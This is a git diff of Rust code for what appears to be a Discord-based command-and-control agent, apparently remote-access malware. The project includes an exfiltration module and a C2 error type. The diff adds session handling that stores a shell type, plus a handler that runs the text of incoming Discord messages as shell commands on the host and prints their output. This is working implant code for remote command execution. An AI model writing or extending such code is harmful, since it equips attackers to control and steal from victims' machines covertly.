@@ -1,10 +1,19 @@
-use anyhow::Error;
+use anyhow::{Error};
 use serenity::{
     client::Context,
-    model::application::interaction::{InteractionResponseType, application_command::ApplicationCommandInteraction}
+    model::application::interaction::{InteractionResponseType, application_command::ApplicationCommandInteraction},
 };
+
 use crate::commands::sessions::session;
 use crate::ephemeral_interaction_create;
+use crate::errors::DiscordC2Error;
+use serenity::model::channel::Message;
+use lazy_static::lazy_static;
+use tokio::sync::Mutex;
+use crate::os::process_handler::ProcessHandler;
+lazy_static! {
+    static ref SHELL_TYPE: Mutex<Option<String>> = Mutex::new(None);
+}
 
 pub mod exfiltrate;
 pub mod info;
@@ -42,12 +51,33 @@ pub async fn handle_purge(ctx: &Context, command: &ApplicationCommandInteraction
     Ok(())
 }
 
+
 pub async fn handle_session(
     ctx: &Context,
     command: &ApplicationCommandInteraction,
 ) -> Result<(), Error> {
-    let content = session::run(&ctx, &command.data.options).await?;
-    ephemeral_interaction_create(ctx, command, &content).await?;
+    let (content, shell) = session::run(&ctx, &command.data.options).await?;
+    ephemeral_interaction_create(&ctx, command, &content).await?;
+
+    let shell_type = shell.ok_or(DiscordC2Error::AgentError("Shell was not properly created".parse().unwrap()))?;
+
+    // Store shell_type in the global variable
+    *SHELL_TYPE.lock().await = Some(shell_type);
+
     Ok(())
 }
 
+pub async fn handle_command(ctx: &Context, message: &Message) -> Result<(), Error> {
+    let shell_type = SHELL_TYPE.lock().await.clone().unwrap();
+    let shell = ProcessHandler::instance(&shell_type).await?;
+
+    println!("Command: {:?}", message.content);
+    if message.content != "exit" {
+
+        let output = shell.run_command(&message.content).await?;
+        println!("Output: {}", output);
+    }
+
+
+    Ok(())
+}
